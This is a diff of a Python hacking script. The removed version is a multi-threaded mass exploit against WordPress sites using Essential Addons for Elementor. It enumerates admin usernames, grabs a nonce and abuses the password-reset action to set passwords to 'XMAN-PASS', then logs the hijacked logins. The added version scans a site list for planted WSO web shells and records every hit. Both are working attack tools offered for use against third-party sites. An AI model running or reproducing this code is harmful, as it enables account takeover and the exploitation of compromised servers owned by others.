@@ -1,40 +1,42 @@
-import json, string, random
-import requests, re, sys
+# -*- coding: Latin-1 -*-
+import sys
+import requests
+import re
 from multiprocessing.dummy import Pool
-from colorama import Fore
-from colorama import init 
+from colorama import Fore, init
+
 init(autoreset=True)
 
-#Coded: XMAN
-fr  =   Fore.RED
-fg  =   Fore.GREEN
+headers = {
+    'Connection': 'keep-alive',
+    'Cache-Control': 'max-age=0',
+    'Upgrade-Insecure-Requests': '1',
+    'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'Accept-Encoding': 'gzip, deflate',
+    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+    'referer': 'www.google.com'
+}
 
-banner = '''{}
-                                                           
-                        ____                          ,--. 
- ,--,     ,--,        ,'  , `.   ,---,              ,--.'| 
- |'. \   / .`|     ,-+-,.' _ |  '  .' \         ,--,:  : | 
- ; \ `\ /' / ;  ,-+-. ;   , || /  ;    '.    ,`--.'`|  ' : 
- `. \  /  / .' ,--.'|'   |  ;|:  :       \   |   :  :  | | 
-  \  \/  / ./ |   |  ,', |  '::  |   /\   \  :   |   \ | : 
-   \  \.'  /  |   | /  | |  |||  :  ' ;.   : |   : '  '; | 
-    \  ;  ;   '   | :  | :  |,|  |  ;/  \   \'   ' ;.    ; 
-   / \  \  \  ;   . |  ; |--' '  :  | \  \ ,'|   | | \   | 
-  ;  /\  \  \ |   : |  | ,    |  |  '  '--'  '   : |  ; .' 
-./__;  \  ;  \|   : '  |/     |  :  :        |   | '`--'   
-|   : / \  \  ;   | |`-'      |  | ,'        '   : |       
-;   |/   \  ' |   ;/          `--''          ;   |.'       
-`---'     `--`'---'                          '---'         
-                                                                                                                         		 
-	    
-        Channel => https://t.me/exploitxx	     
+fr = Fore.RED
+fc = Fore.CYAN
+fw = Fore.WHITE
+fg = Fore.GREEN
+fm = Fore.MAGENTA
 
+print("""
+[#] Create By ::
+   ______      __       _______ ____   ____  _       _____ 
+  / __ \ \    / /\     |__   __/ __ \ / __ \| |     / ____|
+ | |  | \ \  / /  \ ______| | | |  | | |  | | |    | (___  
+ | |  | |\ \/ / /\ \______| | | |  | | |  | | |     \___ \ 
+ | |__| | \  / ____ \     | | | |__| | |__| | |____ ____) |
+  \____/   \/_/    \_\    |_|  \____/ \____/|______|_____/ 
+                          OVA-TOOLS  https://t.me/ovacloud  
+                  Checker Shells [WSO - Any Shell Have Password ]
+""")
 
-  x7root :)   
-
-\n'''.format(fr)
-print banner
-requests.urllib3.disable_warnings()
+requests.packages.urllib3.disable_warnings()
 
 try:
     target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
@@ -42,132 +44,55 @@ except IndexError:
     path = str(sys.argv[0]).split('\\')
     exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')
 
-
-headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
-
 def URLdomain(site):
-	if site.startswith("http://") :
-		site = site.replace("http://","")
-	elif site.startswith("https://") :
-		site = site.replace("https://","")
-	else :
-		pass
-	pattern = re.compile('(.*)/')
-	while re.findall(pattern,site):
-		sitez = re.findall(pattern,site)
-		site = sitez[0]
-	return site
+    if site.startswith("http://"):
+        site = site.replace("http://", "")
+    elif site.startswith("https://"):
+        site = site.replace("https://", "")
+    else:
+        pass
+    pattern = re.compile('(.*)/')
+    while re.findall(pattern, site):
+        sitez = re.findall(pattern, site)
+        site = sitez[0]
+    return site
 
+def protocolChange(site):
+    if 'http://' in site:
+        site = site.replace('http://', 'https://')
+    elif 'https://' in site:
+        site = site.replace('https://', 'http://')
+    return site
 
+def send_get_request(url):
+    try:
+        response = requests.get(url, headers=headers, verify=False, timeout=20)
+        return response.text, response.status_code
+    except Exception as e:
+        print("Error sending GET request to {}: {}".format(url, e))
+        return "", 0
 
-def wpjson(hosts):
-	try:
-	
+def is_injection_successful(response_text, status_code):
+    success_keywords = ['Uname:', '<form method=post>Password<br><input type=password name=pass'] 
+    success_status_codes = [200, 201, 204] 
 
-		
-		domain = "https://" + URLdomain(hosts)
-		
-		url = domain + '/wp-json/wp/v2/users/1'
-		
-		source = requests.get(url, headers=headers,verify=False)
-		if('\/","slug"' in source.text):
-			user_slug = re.findall('"name":"(.*?)","url":"',source.content)[0]
-			return(user_slug)
-		else:
-			return(0)
-		
-	except:
-		pass
-		
-		
-		
-def author(hosts):
-	try:
-	
+    return any(keyword in response_text for keyword in success_keywords) and status_code in success_status_codes
 
-		
-		domain = "https://" + URLdomain(hosts)
-		
-		url = domain + '/?author=1'
-		
-		source = requests.get(url, headers=headers,verify=False)
-		if('/feed/" />' in source.text):
-			user_slug = re.findall('/author/(.*?)/feed/" />',source.content)[0]
-			if('/"' in user_slug or '"' in user_slug):
-				return(0)
-			else:
-				return(user_slug)
-		else:
-			return(0)
-		
-	except:
-		pass
-	
-	
+def ovastart(url):
+    try:
+        response_text, status_code = send_get_request(url)
 
+        if is_injection_successful(response_text, status_code):
+            print(' -| {} --> {}[Successfully]{}'.format(url, fg, fw))
+            open('Results.txt', 'a').write(url + '\n')
+        else:
+            print(' -| {} --> {}[Failed]{}'.format(url, fr, fw))
+    except Exception as e:
+        print(' -| {} --> {}[Failed]: {}{}'.format(url, fr, e, fw))
 
-def elementor(hosts,user):
-	try:
-		
-
-		domain = "https://" + URLdomain(hosts)
-		
-		url = domain + '/wp-admin/admin-ajax.php'
-		
-		lets=requests.Session()
-		
-		source = lets.get(domain, headers=headers, verify=False)
-		if('localize' in source.content):
-			wpnoce = re.findall('"nonce":"(.*?)","i18n":{"added":',source.content)[0]
-			
-			#print wpnoce
-			
-			payload = {
-						"action": "login_or_register_user",
-						"eael-resetpassword-submit": "true",
-						"page_id": "1255",
-						"widget_id": "226",
-						"eael-resetpassword-nonce": wpnoce,
-						"eael-pass1": "XMAN-PASS",
-						"eael-pass2": "XMAN-PASS",
-						"rp_login": user
-					}
-			response = lets.post(url, headers=headers, data=payload)
-			print response.content
-			if('{"success":true,"data":{"message":"' in response.content):
-				print("Target:{} {} Success Vulnerability ").format(domain, fg)
-				open('WPLOGIN.txt','a').write(domain + "/wp-login.php#" + user + "XMAN-PASS" + "\n")
-				
-			else:
-				print("Target:{} {} Not Vulnerability ").format(domain, fr)
-				open('Notgood.txt','a').write(domain + "\n")
-				
-		else:
-			print("Target:{} {} Not Vulnerability ").format(domain, fr)
-		
-	except:
-		pass
-	
-def checkVuln(url):
-	try:
-		wpuser = wpjson(url)
-		if(wpuser != 0):
-			elementor(url,wpuser)
-			
-		else:
-			wpauthor=author(url)
-
-			if(wpauthor != 0):
-				elementor(url,wpauthor)
-				
-			else:
-				elementor(url,'admin')
-			
-		
-	except:
-		pass
-		
-mp = Pool(100)
-mp.map(checkVuln, target)
+mp = Pool(150)
+mp.map(ovastart, target)
 mp.close()
 mp.join()
+
+print('\n [!] {}Saved in Results.txt{}'.format(fc, fw))
